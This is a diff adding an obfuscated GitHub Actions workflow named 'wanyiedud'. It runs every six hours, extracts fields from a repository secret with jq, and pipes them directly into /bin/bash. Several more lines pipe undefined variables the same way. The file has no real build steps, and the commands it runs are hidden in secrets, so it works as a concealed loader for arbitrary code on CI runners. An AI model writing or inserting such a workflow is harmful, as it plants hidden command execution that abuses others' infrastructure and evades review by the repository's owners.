@@ -1,0 +1,22 @@
+name: wanyiedud
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '54 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wanyiedud
+        env:
+          prv76636: ${{ secrets.prv76636 }}
+        run: |
+          echo $prv76636 | jq -r .qrl3101 | /bin/bash
+          echo $dg68145 | jq -r .inn1742 | /bin/bash
+          echo $afuh20 | jq -r .v37675 | /bin/bash
+          echo $o6 | jq -r .b05457 | /bin/bash
+          echo $m737 | jq -r .xjeq00724 | /bin/bash
+
